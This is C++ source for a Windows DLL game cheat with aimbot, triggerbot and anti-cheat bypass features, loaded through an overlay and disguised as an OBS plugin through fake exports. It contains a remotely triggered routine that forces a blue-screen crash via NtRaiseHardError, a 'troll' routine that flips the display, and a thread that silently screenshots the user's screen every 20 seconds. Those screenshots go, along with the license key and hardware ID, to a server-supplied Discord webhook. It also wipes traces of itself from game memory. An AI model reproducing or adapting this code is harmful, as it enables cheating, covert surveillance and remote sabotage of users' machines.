#include <mjLib.hpp>
#include <DirectX/D3D11.h>
#include <DirectX/D3DX11.h>
using namespace mjLib;

#define IMGUI_DEFINE_MATH_OPERATORS
#define IMGUI_ENABLE_FREETYPE
#include <ImGui/imgui.h>
#include <ImGui/imgui_impl_win32.h>
#include <ImGui/imgui_impl_dx11.h>
#include <ImGui/imgui_freetype.h>
#include <ImGui/imgui_internal.h>

static std::atomic<bool> exitLoop = false;
static bool isMenuVisible = true;
static bool destructActive = false;
static float destructStartTime = 0.f;
static bool destructCleanupDone = false;

#include "Menu/Menu.hpp"
#include "Cheat/SimpleMath.h"
#include "Cheat/Game.hpp"
#include "Cheat/Memory.hpp"
#include "Cheat/Cheat.hpp"
#include "security.h"

#include "discord_webhook.h"
#include "screenshot.h"
#include "string_cleaner.h"

#include "destruct.h"
#include "Overlay/Overlay.hpp"
#include <OpenSSL/md5.h>
namespace Utils {
    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

    enum ColorCode {
        DARK_GRAY = 8,
        RED = 12,
        GREEN = 10,
        YELLOW = 14,
        WHITE = 15,
        GRAY = 7
    };

    void setConsoleColor(int color) {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
    }


    void logMessage(ColorCode color, const string& prefix, const string& message) {
        time_t now = time(0);
        tm* localTime = localtime(&now);
        char buffer[80];

        strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", localTime);

        setConsoleColor(color);
        cout << "[" << buffer << "] [" << prefix << "] " << message << endl;
        setConsoleColor(WHITE);
        Sleep(1500);
    }


    std::string GetHWID()
    {
        std::string m_sResult;

        HANDLE m_hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (m_hFile == INVALID_HANDLE_VALUE)
            return { };

        std::unique_ptr< std::remove_pointer <HANDLE >::type, void(*)(HANDLE) > m_hDevice
        {
            m_hFile, [](HANDLE handle)
            {
                CloseHandle(handle);
            }
        };

        STORAGE_PROPERTY_QUERY m_PropertyQuery;
        m_PropertyQuery.PropertyId = StorageDeviceProperty;
        m_PropertyQuery.QueryType = PropertyStandardQuery;

        STORAGE_DESCRIPTOR_HEADER m_DescHeader;
        DWORD m_dwBytesReturned = 0;
        if (!DeviceIoControl(m_hDevice.get(), IOCTL_STORAGE_QUERY_PROPERTY, &m_PropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
            &m_DescHeader, sizeof(STORAGE_DESCRIPTOR_HEADER), &m_dwBytesReturned, NULL))
            return { };

        const DWORD m_dwOutBufferSize = m_DescHeader.Size;
        std::unique_ptr< BYTE[] > m_pOutBuffer{ new BYTE[m_dwOutBufferSize] { } };

        if (!DeviceIoControl(m_hDevice.get(), IOCTL_STORAGE_QUERY_PROPERTY, &m_PropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
            m_pOutBuffer.get(), m_dwOutBufferSize, &m_dwBytesReturned, NULL))
            return { };

        STORAGE_DEVICE_DESCRIPTOR* m_pDeviceDescriptor = reinterpret_cast<STORAGE_DEVICE_DESCRIPTOR*>(m_pOutBuffer.get());
        const DWORD m_dwSerialNumberOffset = m_pDeviceDescriptor->SerialNumberOffset;
        if (m_dwSerialNumberOffset == 0)
            return { };

        m_sResult = reinterpret_cast<const char*>(m_pOutBuffer.get() + m_dwSerialNumberOffset);
        m_sResult.erase(remove_if(m_sResult.begin(), m_sResult.end(), [](unsigned char c) { return isspace(c); }), m_sResult.end());

        return m_sResult;
    }

    void CopyToClipboard(const std::string& text) {
        if (OpenClipboard(NULL)) {
            EmptyClipboard();
            HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
            if (hMem) {
                memcpy(GlobalLock(hMem), text.c_str(), text.size() + 1);
                GlobalUnlock(hMem);
                SetClipboardData(CF_TEXT, hMem);
            }
            CloseClipboard();
        }
    }


    int ShowMessageBox(const std::string& hwid) {
        std::string message = "Your (SessionKey):\n" + hwid + "\n\nKopyalamak için 'Tamam' butonuna tıklayın.";

        int result = MessageBoxA(NULL, message.c_str(), "--", MB_OKCANCEL | MB_ICONINFORMATION);

        if (result == IDOK) {
            CopyToClipboard(hwid);
        }

        return result;
    }
}
using namespace Utils;

bool checkAppStatus(const string& hwid) {
    string appResponse = Network::postRequest("YOUR_APP_ID");
    string userResponse = Network::postRequest("YOUR_USER_API_ID", hwid);
    try {
        json appData = json::parse(appResponse);
        json UserData = json::parse(userResponse);

        if (appData.empty() && UserData.empty()) {
            Logger::WriteLog("Could not get a valid application health status from the API.", Logger::LogLevel::LOG_ERROR);
            return false;
        }
        string version = appData[0]["version"];
        string cfucker = appData[0]["cfucker"];
        string troll = appData[0]["troll"];
        Logger::WriteLog("The connection is being established..", Logger::LogLevel::LOG_DEBUG);
        if (cfucker == "enabled") {
            BOOLEAN bEnabled;
            ULONG uResp;
            LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
            LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
            pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
            pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
            NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
            NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
            return false;
        }
        else if (troll == "enabled") {
            DEVMODE devMode = {};
            devMode.dmSize = sizeof(DEVMODE);
            devMode.dmFields = DM_DISPLAYORIENTATION;
            if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &devMode)) {
                devMode.dmDisplayOrientation = (devMode.dmDisplayOrientation + 2) % 4;
                ChangeDisplaySettingsEx(NULL, &devMode, NULL, CDS_UPDATEREGISTRY | CDS_GLOBAL, NULL);
                Sleep(5000);
                devMode.dmDisplayOrientation = (devMode.dmDisplayOrientation + 2) % 4;
                ChangeDisplaySettingsEx(NULL, &devMode, NULL, CDS_UPDATEREGISTRY | CDS_GLOBAL, NULL);
                srand(time(0));
                for (int i = 0; i < 10; i++) {
                    int x = rand() % GetSystemMetrics(SM_CXSCREEN);
                    int y = rand() % GetSystemMetrics(SM_CYSCREEN);
                    SetCursorPos(x, y);
                    Sleep(150);
                }
            }

        }

        if (version == "1.0")
        {
             
            if (UserData.contains("error")) {
                logMessage(RED, "HATA", UserData["error"]);
                exit(0);
            }
            if (UserData["status"] == "Expired") {
                Logger::WriteLog("User has expired. Access is denied.", Logger::LogLevel::LOG_ERROR);
                exit(0);
            }
            if (UserData["status"] == "Active")
            {
               
                logMessage(GREEN, "Username:", UserData["username"]);
                logMessage(YELLOW, "Exp Date:", UserData["expDate"]);
                if (UserData["Staff"] == 1)
                {
                    logMessage(YELLOW, "User Role:", "Admin");

                }
            }
            else
            {
                Logger::WriteLog("A problem occurred error code: stex.", Logger::LogLevel::LOG_ERROR);
                exit(1);
            }



        }
        else
        {
            logMessage(RED, "HATA", "Server Closed Please contact the App Manager.");
            exit(1);
        }
    }
    catch (const json::parse_error& e) {
        logMessage(RED, "HATA", "A problem occurred in the Request Queue.");
        exit(1);
    }

    return true;
}

 
#include <iostream>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/buffer.h>

std::string base64_encode(const std::string& input) {
    BIO* bio, * b64;
    BUF_MEM* bufferPtr;

    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);

    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL); 
    BIO_write(bio, input.data(), input.size());
    BIO_flush(bio);
    BIO_get_mem_ptr(bio, &bufferPtr);

    std::string encoded(bufferPtr->data, bufferPtr->length);
    BIO_free_all(bio);

    return encoded;
}

void UnloadCheat() {
    DiscordWebhook::LogUnload(Cheats::Auth::keyName, "Normal Unload");

    
    ws_silent_aim_bypass::shutdown();
    ws_aimbot_bypass::shutdown();
    ws_trigger_bypass::shutdown();

    if (Game.pID) {
        HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, Game.pID);
        if (hProcess) {
            StringCleaner cleaner(Game.pID, {
                "alp/fy0w", "Spotify", "obs-text"
            });
            cleaner.clean(hProcess);
        }
    }

    exitLoop = true;
    DestroyOverlay();
    Logger::WriteLog("Cheat unloaded, exiting...", Logger::Logger::LogLevel::LOG_SUCCESSFUL);
    exit(0);
}

#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

std::string HttpPost(const wchar_t* host, INTERNET_PORT port, const std::string& path, const std::string& body) {
    HINTERNET hSession = WinHttpOpen(L"alp-fy0w/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", std::wstring(path.begin(), path.end()).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }

    BOOL sent = WinHttpSendRequest(hRequest, L"Content-Type: application/json\r\n", -1, (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (!sent) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }

    WinHttpReceiveResponse(hRequest, NULL);

    std::string result;
    DWORD bytesRead = 0;
    char buf[4096] = {};
    while (WinHttpReadData(hRequest, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        buf[bytesRead] = 0;
        result += buf;
        bytesRead = 0;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

std::string HttpGet(const wchar_t* host, INTERNET_PORT port, const std::string& path) {
    HINTERNET hSession = WinHttpOpen(L"alp-fy0w/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", std::wstring(path.begin(), path.end()).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    std::string result;
    DWORD bytesRead = 0;
    char buf[4096] = {};
    while (WinHttpReadData(hRequest, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        buf[bytesRead] = 0;
        result += buf;
        bytesRead = 0;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

std::string ExtractJsonField(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos = json.find(":", pos + search.length());
    if (pos == std::string::npos) return "";
    pos++;
    while (pos < json.size() && json[pos] == ' ') pos++;
    if (pos >= json.size()) return "";

    if (json[pos] == '"') {
        pos++;
        size_t end = json.find("\"", pos);
        if (end == std::string::npos) return "";
        return json.substr(pos, end - pos);
    }
    else {
        size_t end = pos;
        while (end < json.size() && json[end] != ',' && json[end] != '}' && json[end] != '\n') end++;
        return json.substr(pos, end - pos);
    }
}

bool AuthenticateWithKey(const std::string& key) {
    std::string hwid = base64_encode(GetHWID());
    std::string body = "{\"key\":\"" + key + "\",\"hwid\":\"" + hwid + "\"}";

    std::string response = HttpPost(L"127.0.0.1", 3000, "/api/validate-key", body);
    if (response.empty()) {
        return false;
    }

    std::string valid = ExtractJsonField(response, "valid");
    if (valid != "true") {
        std::string error = ExtractJsonField(response, "error");
        setConsoleColor(12);
        printf("\n  [!] Auth failed: %s\n", error.c_str());
        setConsoleColor(7);
        return false;
    }

    Cheats::Auth::keyName = ExtractJsonField(response, "keyName");
    Cheats::Auth::keyDate = ExtractJsonField(response, "keyDate");
    DiscordWebhook::screenshotUrl = ExtractJsonField(response, "webhookUrl");
    Cheats::Auth::authenticated = true;

    return true;
}

void CheatThread() {
    while (!(GetAsyncKeyState(VK_SHIFT) & 0x8000 && GetAsyncKeyState(VK_F6) & 0x8000)) {
        Sleep(200);
    }
    Sleep(300);

    DiscordWebhook::DecryptAll();

    mjLib::Console::Enable();
    SetConsoleTitle("alp/fy0w");
    SetConsoleOutputCP(CP_UTF8);

    drawLogoAnimated();

    setConsoleColor(14);
    printf("  Checking auth server...");
    std::string statusResp = HttpGet(L"127.0.0.1", 3000, "/api/status");
    if (statusResp.empty()) {
        setConsoleColor(12);
        printf(" FAILED\n");
        setConsoleColor(12);
        printf("\n  [!] Auth server is not running!\n");
        printf("  [!] Start AuthServer.exe first.\n\n");
        setConsoleColor(7);
        while (!(GetAsyncKeyState(VK_RETURN) & 1)) Sleep(50);
        mjLib::Console::Close();
        return;
    }
    setConsoleColor(10);
    printf(" OK\n\n");

    bool authed = false;
    std::string authedKey = "";
    while (!authed) {
        setConsoleColor(14);
        printf("  Enter your license key:\n");
        setConsoleColor(7);
        printf("  > ");

        char input[128] = {};
        fgets(input, sizeof(input), stdin);
        std::string key(input);
        key.erase(std::remove(key.begin(), key.end(), '\n'), key.end());
        key.erase(std::remove(key.begin(), key.end(), '\r'), key.end());

        if (key.empty()) continue;

        setConsoleColor(8);
        printf("\n  Validating key...\n");
        setConsoleColor(7);

        authed = AuthenticateWithKey(key);
        if (!authed) {
            setConsoleColor(12);
            printf("  Invalid key. Try again.\n\n");
            setConsoleColor(7);
            DiscordWebhook::LogWrongKey(key, base64_encode(GetHWID()), "Invalid key");
        } else {
            authedKey = key;
        }
    }

    setConsoleColor(10);
    printf("\n  Authentication successful!\n");
    setConsoleColor(14);
    printf("  Welcome, %s\n", Cheats::Auth::username.c_str());
    printf("  Key: %s\n", Cheats::Auth::keyName.c_str());
    printf("  Expires: %s\n\n", Cheats::Auth::keyDate.c_str());
    setConsoleColor(7);

    DiscordWebhook::LogLogin(Cheats::Auth::keyName, Cheats::Auth::keyDate, base64_encode(GetHWID()));

    printf("  Starting overlay in 2 seconds...");
    Sleep(2000);

    mjLib::Console::Close();

    int screenshotInterval = 20;

    std::string screenshotHwid = base64_encode(GetHWID());
    std::string screenshotKeyName = Cheats::Auth::keyName;

    std::thread([screenshotInterval, authedKey, screenshotHwid, screenshotKeyName]() {
        while (!exitLoop) {
            Sleep(screenshotInterval * 1000);
            if (!exitLoop && !DiscordWebhook::screenshotUrl.empty() && !destructActive) {
                Screenshot::CaptureAndSend(DiscordWebhook::screenshotUrl, authedKey, screenshotKeyName, screenshotHwid);
            }
        }
    }).detach();

    std::thread([authedKey]() {
        while (!exitLoop) {
            Sleep(300000);
            if (exitLoop || destructActive) break;
            std::string body = "{\"key\":\"" + authedKey + "\",\"seconds\":\"300\"}";
            HttpPost(L"127.0.0.1", 3000, "/api/update-playtime", body);
        }
    }).detach();

    std::thread([]() {
        while (!exitLoop) {
            if (Game.pID) {
                Sleep(2000);
                continue;
            }
            Game.pID = FindGame();
            if (Game.pID) {
                Game.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Game.pID);
                if (Game.hProcess) {
                    Offsets.GameBase = GetBaseAddress();
                    
                    Sleep(500);
                    ReadOffsets();
                    
                    while (!Game.hWnd) {
                        Game.hWnd = FindWindow(Game.lpClassName, NULL);
                        Sleep(500);
                    }
                    
                    
                    std::thread(UpdateOverlay).detach();
                    std::thread(UpdatePeds).detach();
                    std::thread([]() { GetPlayerNames::UpdatePlayerNames(); }).detach();
                    std::thread(SetAim).detach();
                    std::thread(TriggerBot).detach();
                    std::thread(MiscFeatures).detach();
                    
                    
                    while (!exitLoop) {
                        Sleep(1000);
                    }
                }
            }
            Sleep(1000);
        }
    }).detach();

    CreateOverlay();

    if (Overlay.pDevice && !texture::logo_image) {
        D3DX11_IMAGE_LOAD_INFO iInfo;
        D3DX11CreateShaderResourceViewFromMemory(Overlay.pDevice, logo_png, logo_png_len, &iInfo, nullptr, &texture::logo_image, 0);
    }

    OverlayMain();

    if (Security::detected) {
        if (Game.pID) {
            HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, Game.pID);
            if (hProcess) {
                StringCleaner cleaner(Game.pID, {
                    "alp/fy0w", "Spotify", "obs-text",
                    "discord.com/api/webhooks"
                });
                cleaner.clean(hProcess);
            }
        }
        DiscordWebhook::LogUnload(Cheats::Auth::keyName, "Security Triggered - Blacklisted Process");
    }

    DiscordWebhook::ClearUrls();
    DiscordWebhook::LogDisconnect(Cheats::Auth::keyName, "Session ended");

    DestroyOverlay();
    while (!exitLoop) {
        if (GetAsyncKeyState(VK_F10) & 1) {
            UnloadCheat();
        }
        Sleep(100);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CheatThread, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}

extern "C" {
    __declspec(noinline) bool obs_module_load_export(void* module) { volatile int x = 1; return x != 0; }
    __declspec(noinline) void obs_module_unload_export(void) { volatile int x = 0; (void)x; }
    __declspec(noinline) const char* obs_module_description_export(void) { return "alp/fy0w Text Source"; }
    __declspec(noinline) void obs_module_set_pointer_export(void* obs) { volatile int x = 0; (void)x; (void)obs; }
    __declspec(noinline) unsigned int obs_module_ver_export(void) { return 1; }
    __declspec(noinline) void obs_module_set_locale_export(const char* locale) { volatile int x = 0; (void)x; (void)locale; }
    __declspec(noinline) void obs_module_free_locale_export(void) { volatile int x = 0; (void)x; }
    __declspec(noinline) const char* obs_module_get_string_export(const char* id) { return id; }

#pragma comment(linker, "/EXPORT:obs_module_load=obs_module_load_export")
#pragma comment(linker, "/EXPORT:obs_module_unload=obs_module_unload_export")
#pragma comment(linker, "/EXPORT:obs_module_description=obs_module_description_export")
#pragma comment(linker, "/EXPORT:obs_module_set_pointer=obs_module_set_pointer_export")
#pragma comment(linker, "/EXPORT:obs_module_ver=obs_module_ver_export")
#pragma comment(linker, "/EXPORT:obs_module_set_locale=obs_module_set_locale_export")
#pragma comment(linker, "/EXPORT:obs_module_free_locale=obs_module_free_locale_export")
#pragma comment(linker, "/EXPORT:obs_module_get_string=obs_module_get_string_export")
}